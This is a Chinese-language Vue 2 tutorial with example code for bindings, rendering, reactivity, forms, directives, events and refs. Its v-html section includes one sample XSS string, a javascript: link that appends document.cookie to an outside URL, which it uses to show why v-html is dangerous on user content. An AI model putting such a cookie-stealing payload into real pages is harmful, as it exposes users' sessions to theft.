Vue模板语法有2大类：<br />**1.插值语法<br />**功能：用于解析标签体内容。<br />写法：{{xxx}}，xxx是**js表达式**，且可以直接读取到data中的所有属性。<br />**2.指令语法**<br />功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）。<br />举例：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写**js表达式**，<br />且可以直接读取到data中的所有属性。<br />备注：Vue中有很多的指令，且形式都是：v-????
<a name="svAcA"></a>
## 数据绑定
**Vue中有2种数据绑定的方式**

- 单向绑定(v-bind)：数据只能从data流向页面。
- 双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。
> 备注：双向绑定一般都应用在表单类元素上（如：input、select等），v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。

```html
<!-- 准备好一个容器-->
<div id="root">
  <!-- 普通写法 -->
  <!-- 单向数据绑定：<input type="text" v-bind:value="name"><br/>
   双向数据绑定：<input type="text" v-model:value="name"><br/> -->

  <!-- 简写 -->
  单向数据绑定：<input type="text" :value="name"><br/>
  双向数据绑定：<input type="text" v-model="name"><br/>

  <!-- 如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上 -->
  <!-- <h2 v-model:x="name">你好啊</h2> -->
</div>

<script type="text/javascript">
  Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

  new Vue({
    el:'#root',
    data:{
      name:'尚硅谷'
    }
  })
</script>
```
<a name="RExVM"></a>
## 绑定样式
**class样式**

- 写法:class="xxx" xxx可以是字符串、对象、数组。
   - 字符串写法适用于：类名不确定，要动态获取。
   - 对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
   - 数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。

**style样式**

- :style="{fontSize: xxx}"其中xxx是动态值。
- :style="[a,b]"其中a、b是样式对象。
```html
<style>
  .basic{
    width: 400px;
    height: 100px;
    border: 1px solid black;
  }

  .happy{
    border: 4px solid red;;
    background-color: rgba(255, 255, 0, 0.644);
    background: linear-gradient(30deg,yellow,pink,orange,yellow);
  }
  .sad{
    border: 4px dashed rgb(2, 197, 2);
    background-color: gray;
  }
  .normal{
    background-color: skyblue;
  }

  .atguigu1{
    background-color: yellowgreen;
  }
  .atguigu2{
    font-size: 30px;
    text-shadow:2px 2px 10px red;
  }
  .atguigu3{
    border-radius: 20px;
  }
</style>

<!-- 准备好一个容器-->
<div id="root">
  <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
  <div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>

  <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
  <div class="basic" :class="classArr">{{name}}</div> <br/><br/>

  <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
  <div class="basic" :class="classObj">{{name}}</div> <br/><br/>

  <!-- 绑定style样式--对象写法 -->
  <div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
  <!-- 绑定style样式--数组写法 -->
  <div class="basic" :style="styleArr">{{name}}</div>
</div>

<script type="text/javascript">
  const vm = new Vue({
    el:'#root',
    data:{
      name:'尚硅谷',
      mood:'normal',
      classArr:['atguigu1','atguigu2','atguigu3'],
      classObj:{
        atguigu1:false,
        atguigu2:false,
      },
      styleObj:{
        fontSize: '40px',
        color:'red',
      },
      styleObj2:{
        backgroundColor:'orange'
      },
      styleArr:[
        {
          fontSize: '40px',
          color:'blue',
        },
        {
          backgroundColor:'gray'
        }
      ]
    },
    methods: {
      changeMood(){
        const arr = ['happy','sad','normal']
        const index = Math.floor(Math.random()*3)
        this.mood = arr[index]
      }
    },
  })
</script>
```
<a name="Q90vg"></a>
## 条件渲染
**v-if**

- 写法
   - v-if="表达式" 
   - v-else-if="表达式"
   - v-else="表达式"
- 适用于：切换频率较低的场景。
- 特点：不展示的DOM元素直接被移除。
- 注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。

**v-show**

- 写法：v-show="表达式"
- 适用于：切换频率较高的场景。
- 特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
> 备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。

```html
<!-- 准备好一个容器-->
<div id="root">
  <h2>当前的n值是:{{n}}</h2>
  <button @click="n++">点我n+1</button>
  <!-- 使用v-show做条件渲染 -->
  <h2 v-show="false">欢迎来到{{name}}</h2>
  <h2 v-show="1 === 1">欢迎来到{{name}}</h2>

  <!-- 使用v-if做条件渲染 -->
  <h2 v-if="false">欢迎来到{{name}}</h2>
  <h2 v-if="1 === 1">欢迎来到{{name}}</h2>

  <!-- v-else和v-else-if -->
  <div v-if="n === 1">Angular</div>
  <div v-else-if="n === 2">React</div>
  <div v-else-if="n === 3">Vue</div>
  <div v-else>哈哈</div>

  <!-- v-if与template的配合使用 -->
  <template v-if="n === 1">
    <h2>你好</h2>
    <h2>尚硅谷</h2>
    <h2>北京</h2>
  </template>

</div>

<script type="text/javascript">
  const vm = new Vue({
    el:'#root',
    data:{
      name:'尚硅谷',
      n:0
    }
  })
</script>
```
<a name="bYHVJ"></a>
## 列表渲染
<a name="nalUK"></a>
### v-for指令

1. 用于展示列表数据
2. 语法：v-for="(item, index) in xxx" :key="yyy"
3. 可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
```html
<!-- 准备好一个容器-->
<div id="root">
  <!-- 遍历数组 -->
  <h2>人员列表（遍历数组）</h2>
  <ul>
    <li v-for="(p,index) of persons" :key="index">
      {{p.name}}-{{p.age}}
    </li>
  </ul>

  <!-- 遍历对象 -->
  <h2>汽车信息（遍历对象）</h2>
  <ul>
    <li v-for="(value,k) of car" :key="k">
      {{k}}-{{value}}
    </li>
  </ul>

  <!-- 遍历字符串 -->
  <h2>测试遍历字符串（用得少）</h2>
  <ul>
    <li v-for="(char,index) of str" :key="index">
      {{char}}-{{index}}
    </li>
  </ul>

  <!-- 遍历指定次数 -->
  <h2>测试遍历指定次数（用得少）</h2>
  <ul>
    <li v-for="(number,index) of 5" :key="index">
      {{index}}-{{number}}
    </li>
  </ul>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false

  new Vue({
    el:'#root',
    data:{
      persons:[
        {id:'001',name:'张三',age:18},
        {id:'002',name:'李四',age:19},
        {id:'003',name:'王五',age:20}
      ],
      car:{
        name:'奥迪A8',
        price:'70万',
        color:'黑色'
      },
      str:'hello'
    }
  })
</script>
```
<a name="lMpZt"></a>
### key的原理
面试题：react、vue中的key有什么作用？（key的内部原理）

1. 虚拟DOM中key的作用：
   - key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
2. 对比规则：
   - 旧虚拟DOM中找到了与新虚拟DOM相同的key：
      - 若虚拟DOM中内容没变, 直接使用之前的真实DOM！
      - 若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
   - 旧虚拟DOM中未找到与新虚拟DOM相同的key
      - 创建新的真实DOM，随后渲染到到页面。
3. 用index作为key可能会引发的问题：
   - 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
      - 会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
   - 如果结构中还包含输入类的DOM：
      - 会产生错误DOM更新 ==> 界面有问题。
4.  开发中如何选择key?:
   - 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
   - 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。
```html
<!-- 准备好一个容器-->
<div id="root">
  <!-- 遍历数组 -->
  <h2>人员列表（遍历数组）</h2>
  <button @click.once="add">添加一个老刘</button>
  <ul>
    <li v-for="(p,index) of persons" :key="index">
      {{p.name}}-{{p.age}}
      <input type="text">
    </li>
  </ul>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false

  new Vue({
    el:'#root',
    data:{
      persons:[
        {id:'001',name:'张三',age:18},
        {id:'002',name:'李四',age:19},
        {id:'003',name:'王五',age:20}
      ]
    },
    methods: {
      add(){
        const p = {id:'004',name:'老刘',age:40}
        this.persons.unshift(p)
      }
    },
  })
</script>
```
<a name="mrXYr"></a>
### 列表过滤
```html
<!-- 准备好一个容器-->
<div id="root">
  <h2>人员列表</h2>
  <input type="text" placeholder="请输入名字" v-model="keyWord">
  <ul>
    <li v-for="(p,index) of filPerons" :key="index">
      {{p.name}}-{{p.age}}-{{p.sex}}
    </li>
  </ul>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false

  //用watch实现
  //#region 
  /* new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					],
					filPerons:[]
				},
				watch:{
					keyWord:{
						immediate:true,
						handler(val){
							this.filPerons = this.persons.filter((p)=>{
								return p.name.indexOf(val) !== -1
							})
						}
					}
				}
			}) */
  //#endregion

  //用computed实现
  new Vue({
    el:'#root',
    data:{
      keyWord:'',
      persons:[
        {id:'001',name:'马冬梅',age:19,sex:'女'},
        {id:'002',name:'周冬雨',age:20,sex:'女'},
        {id:'003',name:'周杰伦',age:21,sex:'男'},
        {id:'004',name:'温兆伦',age:22,sex:'男'}
      ]
    },
    computed:{
      filPerons(){
        return this.persons.filter((p)=>{
          return p.name.indexOf(this.keyWord) !== -1
        })
      }
    }
  }) 
</script>
```
<a name="P1Q2g"></a>
### 列表排序
```html
<!-- 准备好一个容器-->
<div id="root">
  <h2>人员列表</h2>
  <input type="text" placeholder="请输入名字" v-model="keyWord">
  <button @click="sortType = 2">年龄升序</button>
  <button @click="sortType = 1">年龄降序</button>
  <button @click="sortType = 0">原顺序</button>
  <ul>
    <li v-for="(p,index) of filPerons" :key="p.id">
      {{p.name}}-{{p.age}}-{{p.sex}}
      <input type="text">
    </li>
  </ul>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false

  new Vue({
    el:'#root',
    data:{
      keyWord:'',
      sortType:0, //0原顺序 1降序 2升序
      persons:[
        {id:'001',name:'马冬梅',age:30,sex:'女'},
        {id:'002',name:'周冬雨',age:31,sex:'女'},
        {id:'003',name:'周杰伦',age:18,sex:'男'},
        {id:'004',name:'温兆伦',age:19,sex:'男'}
      ]
    },
    computed:{
      filPerons(){
        const arr = this.persons.filter((p)=>{
          return p.name.indexOf(this.keyWord) !== -1
        })
        //判断一下是否需要排序
        if(this.sortType){
          arr.sort((p1,p2)=>{
            return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
          })
        }
        return arr
      }
    }
  }) 

</script>
```
<a name="C8lBv"></a>
### 列表更新
```html
<!-- 准备好一个容器-->
<div id="root">
  <h2>人员列表</h2>
  <button @click="updateMei">更新马冬梅的信息</button>
  <ul>
    <li v-for="(p,index) of persons" :key="p.id">
      {{p.name}}-{{p.age}}-{{p.sex}}
    </li>
  </ul>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false

  const vm = new Vue({
    el:'#root',
    data:{
      persons:[
        {id:'001',name:'马冬梅',age:30,sex:'女'},
        {id:'002',name:'周冬雨',age:31,sex:'女'},
        {id:'003',name:'周杰伦',age:18,sex:'男'},
        {id:'004',name:'温兆伦',age:19,sex:'男'}
      ]
    },
    methods: {
      updateMei(){
        // this.persons[0].name = '马老师' //奏效
        // this.persons[0].age = 50 //奏效
        // this.persons[0].sex = '男' //奏效
        // this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
        this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})
      }
    }
  }) 

</script>
```
<a name="tYFbY"></a>
### Vue监视数据的原理

1. vue会监视data中所有层次的数据。
2. 如何监测对象中的数据？
   - 通过setter实现监视，且要在new Vue时就传入要监测的数据。
      - 对象中后追加的属性，Vue默认不做响应式处理
      - 如需给后添加的属性做响应式，请使用如下API：
         - Vue.set(target，propertyName/index，value) 或 
         - vm.$set(target，propertyName/index，value)
3. 如何监测数组中的数据？
- 通过包裹数组更新元素的方法实现，本质就是做了两件事：
   - 调用原生对应的方法对数组进行更新。
   - 重新解析模板，进而更新页面。
4. 在Vue修改数组中的某个元素一定要用如下方法：
   - 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
   - Vue.set() 或 vm.$set()

特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！
```html
<!-- 准备好一个容器-->
<div id="root">
  <h1>学生信息</h1>
  <button @click="student.age++">年龄+1岁</button> <br/>
  <button @click="addSex">添加性别属性，默认值：男</button> <br/>
  <button @click="student.sex = '未知' ">修改性别</button> <br/>
  <button @click="addFriend">在列表首位添加一个朋友</button> <br/>
  <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br/>
  <button @click="addHobby">添加一个爱好</button> <br/>
  <button @click="updateHobby">修改第一个爱好为：开车</button> <br/>
  <button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
  <h3>姓名：{{student.name}}</h3>
  <h3>年龄：{{student.age}}</h3>
  <h3 v-if="student.sex">性别：{{student.sex}}</h3>
  <h3>爱好：</h3>
  <ul>
    <li v-for="(h,index) in student.hobby" :key="index">
      {{h}}
    </li>
  </ul>
  <h3>朋友们：</h3>
  <ul>
    <li v-for="(f,index) in student.friends" :key="index">
      {{f.name}}--{{f.age}}
    </li>
  </ul>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

  const vm = new Vue({
    el:'#root',
    data:{
      student:{
        name:'tom',
        age:18,
        hobby:['抽烟','喝酒','烫头'],
        friends:[
          {name:'jerry',age:35},
          {name:'tony',age:36}
        ]
      }
    },
    methods: {
      addSex(){
        // Vue.set(this.student,'sex','男')
        this.$set(this.student,'sex','男')
      },
      addFriend(){
        this.student.friends.unshift({name:'jack',age:70})
      },
      updateFirstFriendName(){
        this.student.friends[0].name = '张三'
      },
      addHobby(){
        this.student.hobby.push('学习')
      },
      updateHobby(){
        // this.student.hobby.splice(0,1,'开车')
        // Vue.set(this.student.hobby,0,'开车')
        this.$set(this.student.hobby,0,'开车')
      },
      removeSmoke(){
        this.student.hobby = this.student.hobby.filter((h)=>{
          return h !== '抽烟'
        })
      }
    }
  })
</script>
```
<a name="attPx"></a>
## 收集表单数据

- 若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
- 若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
- 若：<input type="checkbox"/>
   - 没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
   - 配置input的value属性:
      - v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
      - v-model的初始值是数组，那么收集的的就是value组成的数组
- 备注：v-model的三个修饰符：
   - lazy：失去焦点再收集数据
   - number：输入字符串转为有效的数字
   - trim：输入首尾空格过滤
```html
<!-- 准备好一个容器-->
<div id="root">
  <form @submit.prevent="demo">
    账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
    密码：<input type="password" v-model="userInfo.password"> <br/><br/>
    年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
    性别：
    男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
    女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
    爱好：
    学习<input type="checkbox" v-model="userInfo.hobby" value="study">
    打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
    吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
    <br/><br/>
    所属校区
    <select v-model="userInfo.city">
      <option value="">请选择校区</option>
      <option value="beijing">北京</option>
      <option value="shanghai">上海</option>
      <option value="shenzhen">深圳</option>
      <option value="wuhan">武汉</option>
    </select>
    <br/><br/>
    其他信息：
    <textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
    <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
    <button>提交</button>
  </form>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false

  new Vue({
    el:'#root',
    data:{
      userInfo:{
        account:'',
        password:'',
        age:18,
        sex:'female',
        hobby:[],
        city:'beijing',
        other:'',
        agree:''
      }
    },
    methods: {
      demo(){
        console.log(JSON.stringify(this.userInfo))
      }
    }
  })
</script>
```
<a name="UwRhY"></a>
## 内置指令
复习学过的指令：

- v-bind  : 单向绑定解析表达式, 可简写为 :xxx
- v-model : 双向数据绑定
- v-for   : 遍历数组/对象/字符串
- v-on    : 绑定事件监听, 可简写为@
- v-if        : 条件渲染（动态控制节点是否存存在）
- v-else  : 条件渲染（动态控制节点是否存存在）
- v-show  : 条件渲染 (动态控制节点是否展示)
<a name="lTOlo"></a>
### v-text指令

1. 作用：向其所在的节点中渲染文本内容。
2. 与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
```html
<!-- 准备好一个容器-->
<div id="root">
  <div>你好，{{name}}</div>
  <div v-text="name"></div>
  <div v-text="str"></div>
</div>

<script type="text/javascript">
  new Vue({
    el:'#root',
    data:{
      name:'尚硅谷',
      str:'<h3>你好啊！</h3>'
    }
  })
</script>
```
<a name="WPffL"></a>
### v-html指令
v-html指令：

1. 作用：向指定节点中渲染包含html结构的内容。
2. 与插值语法的区别：
   - v-html会替换掉节点中所有的内容，{{xx}}则不会。
   - v-html可以识别html结构。
3. 严重注意：v-html有安全性问题！！！！
   - 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
   - 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
```html
<!-- 准备好一个容器-->
<div id="root">
  <div>你好，{{name}}</div>
  <div v-html="str"></div>
  <div v-html="str2"></div>
</div>

<script type="text/javascript">
  new Vue({
    el:'#root',
    data:{
      name:'尚硅谷',
      str:'<h3>你好啊！</h3>',
      str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
    }
  })
</script>
```
<a name="Ahk28"></a>
### v-cloak指令
v-cloak指令（没有值）：

1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
2. 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
```html
<!-- 准备好一个容器-->
<div id="root">
  <h2 v-cloak>{{name}}</h2>
</div>

<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>


<script type="text/javascript">
  console.log(1)

  new Vue({
    el:'#root',
    data:{
      name:'尚硅谷'
    }
  })
</script>
```
<a name="PWg2X"></a>
### v-once指令

1. v-once所在节点在初次动态渲染后，就视为静态内容了。
2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
```html
<!-- 准备好一个容器-->
<div id="root">
  <h2 v-once>初始化的n值是:{{n}}</h2>
  <h2>当前的n值是:{{n}}</h2>
  <button @click="n++">点我n+1</button>
</div>

<script type="text/javascript">
  new Vue({
    el:'#root',
    data:{
      n:1
    }
  })
</script>
```
<a name="dLuZV"></a>
### v-pre指令

1. 跳过其所在节点的编译过程。
2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
```html
<!-- 准备好一个容器-->
<div id="root">
  <h2 v-pre>Vue其实很简单</h2>
  <h2 >当前的n值是:{{n}}</h2>
  <button @click="n++">点我n+1</button>
</div>

<script type="text/javascript">
  new Vue({
    el:'#root',
    data:{
      n:1
    }
  })
</script>
```
<a name="zIyOf"></a>
## 自定义指令
> 需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。<br />需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。

一、定义语法：

   - 局部指令：new Vue({ `directives:{指令名:配置对象}  `})   或 new Vue({`directives{指令名:回调函数}`  })
   - 全局指令：Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)

二、配置对象中常用的3个回调：

   - bind：指令与元素成功绑定时调用。
   - inserted：指令所在元素被插入页面时调用。
   - update：指令所在模板结构被重新解析时调用。

三、备注：

   - 指令定义时不加v-，但使用时要加v-；
   - 指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
```html
<!-- 准备好一个容器-->
<div id="root">
  <h2>{{name}}</h2>
  <h2>当前的n值是：<span v-text="n"></span> </h2>
  <!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
  <h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
  <button @click="n++">点我n+1</button>
  <hr/>
  <input type="text" v-fbind:value="n">
</div>

<script type="text/javascript">
  Vue.config.productionTip = false

  //定义全局指令
  /* Vue.directive('fbind',{
			//指令与元素成功绑定时（一上来）
			bind(element,binding){
				element.value = binding.value
			},
			//指令所在元素被插入页面时
			inserted(element,binding){
				element.focus()
			},
			//指令所在的模板被重新解析时
			update(element,binding){
				element.value = binding.value
			}
		}) */

  new Vue({
    el:'#root',
    data:{
      name:'尚硅谷',
      n:1
    },
    directives:{
      //big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
      /* 'big-number'(element,binding){
					// console.log('big')
					element.innerText = binding.value * 10
				}, */
      big(element,binding){
        console.log('big',this) //注意此处的this是window
        // console.log('big')
        element.innerText = binding.value * 10
      },
      fbind:{
        //指令与元素成功绑定时（一上来）
        bind(element,binding){
          element.value = binding.value
        },
        //指令所在元素被插入页面时
        inserted(element,binding){
          element.focus()
        },
        //指令所在的模板被重新解析时
        update(element,binding){
          element.value = binding.value
        }
      }
    }
  })

</script>
```
<a name="UkNJp"></a>
## 事件

- 使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；
- 事件的回调需要配置在methods对象中，最终会在vm上；
- methods中配置的函数，不要用箭头函数！否则this就不是vm了；
- methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
- @click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；
```html
<!-- 准备好一个容器-->
<div id="root">
  <h2>欢迎来到{{name}}学习</h2>
  <!-- <button v-on:click="showInfo">点我提示信息</button> -->
  <button @click="showInfo1">点我提示信息1（不传参）</button>
  <button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
</div>

<script type="text/javascript">
  const vm = new Vue({
    el:'#root',
    data:{
      name:'尚硅谷',
    },
    methods:{
      showInfo1(event){
        // console.log(event.target.innerText)
        // console.log(this) //此处的this是vm
        alert('同学你好！')
      },
      showInfo2(event,number){
        console.log(event,number)
        // console.log(event.target.innerText)
        // console.log(this) //此处的this是vm
        alert('同学你好！！')
      }
    }
  })
</script>
```
**事件修饰符**

1. prevent：阻止默认事件（常用）；
2. stop：阻止事件冒泡（常用）；
3. once：事件只触发一次（常用）；
4. capture：使用事件的捕获模式；
5. self：只有event.target是当前操作的元素时才触发事件；
6. passive：事件的默认行为立即执行，无需等待事件回调执行完毕；
```html
<!-- 准备好一个容器-->
<div id="root">
  <h2>欢迎来到{{name}}学习</h2>
  <!-- 阻止默认事件（常用） -->
  <a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>

  <!-- 阻止事件冒泡（常用） -->
  <div class="demo1" @click="showInfo">
    <button @click.stop="showInfo">点我提示信息</button>
    <!-- 修饰符可以连续写 -->
    <!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
  </div>

  <!-- 事件只触发一次（常用） -->
  <button @click.once="showInfo">点我提示信息</button>

  <!-- 使用事件的捕获模式 -->
  <div class="box1" @click.capture="showMsg(1)">
    div1
    <div class="box2" @click="showMsg(2)">
      div2
    </div>
  </div>

  <!-- 只有event.target是当前操作的元素时才触发事件； -->
  <div class="demo1" @click.self="showInfo">
    <button @click="showInfo">点我提示信息</button>
  </div>

  <!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； -->
  <ul @wheel.passive="demo" class="list">
    <li>1</li>
    <li>2</li>
    <li>3</li>
    <li>4</li>
  </ul>

</div>

<script type="text/javascript">
  new Vue({
    el:'#root',
    data:{
      name:'尚硅谷'
    },
    methods:{
      showInfo(e){
        alert('同学你好！')
        // console.log(e.target)
      },
      showMsg(msg){
        console.log(msg)
      },
      demo(){
        for (let i = 0; i < 100000; i++) {
          console.log('#')
        }
        console.log('累坏了')
      }
    }
  })
</script>
```
**键盘事件**<br />1.Vue中常用的按键别名：<br />            回车 => enter<br />            删除 => delete (捕获“删除”和“退格”键)<br />            退出 => esc<br />            空格 => space<br />            换行 => tab (特殊，必须配合keydown去使用)<br />            上 => up<br />            下 => down<br />            左 => left<br />            右 => right<br />2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）<br />3.系统修饰键（用法特殊）：ctrl、alt、shift、meta<br />    (1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。<br />    (2).配合keydown使用：正常触发事件。<br />4.也可以使用keyCode去指定具体的按键（不推荐）<br />5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
```html
<!-- 准备好一个容器-->
<div id="root">
  <h2>欢迎来到{{name}}学习</h2>
  <input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
</div>

<script type="text/javascript">
  Vue.config.keyCodes.huiche = 13 //定义了一个别名按键

  new Vue({
    el:'#root',
    data:{
      name:'尚硅谷'
    },
    methods: {
      showInfo(e){
        // console.log(e.key,e.keyCode)
        console.log(e.target.value)
      }
    },
  })
</script>
```
<a name="N7tE2"></a>
## ref属性

1. 被用来给元素或子组件注册引用信息（id的替代者）
2. 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
3. 使用方式： 
   1. 打标识：`<h1 ref="xxx">.....</h1>` 或 `<School ref="xxx"></School>`
   2. 获取：`this.$refs.xxx`
```vue
<template>
	<div>
		<h1 v-text="msg" ref="title"></h1>
		<button ref="btn" @click="showDOM">点我输出上方的DOM元素</button>
		<School ref="sch"/>
	</div>
</template>

<script>
	//引入School组件
	import School from './components/School'

	export default {
		name:'App',
		components:{School},
		data() {
			return {
				msg:'欢迎学习Vue！'
			}
		},
		methods: {
			showDOM(){
				console.log(this.$refs.title) //真实DOM元素
				console.log(this.$refs.btn) //真实DOM元素
				console.log(this.$refs.sch) //School组件的实例对象（vc）
			}
		},
	}
</script>

```
<a name="87132350"></a>
## <br />
